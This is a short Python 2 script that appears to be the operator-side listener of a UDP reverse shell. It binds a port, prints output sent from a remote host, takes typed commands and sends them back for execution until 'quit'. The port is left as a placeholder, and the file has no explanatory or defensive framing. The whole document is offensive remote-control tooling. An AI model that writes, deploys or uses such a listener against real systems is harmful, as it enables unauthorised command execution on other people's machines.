#!/usr/bin/python
import socket, subprocess
import time
import sys                                                                                                                       

HOST = ''
PORT = remote_port

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((HOST, PORT))
    while 1:  
        result, (rip, rport) = s.recvfrom(1024)
        sys.stdout.write(result)
        cmd = raw_input('%s@%d $ ' %(rip, rport))
        s.sendto(cmd, (rip, rport))
        if 'quit' in cmd:
            break
except KeyboardInterrupt:
    print 'quit'
    s.sendto('quit', (rip, rport))
s.close()

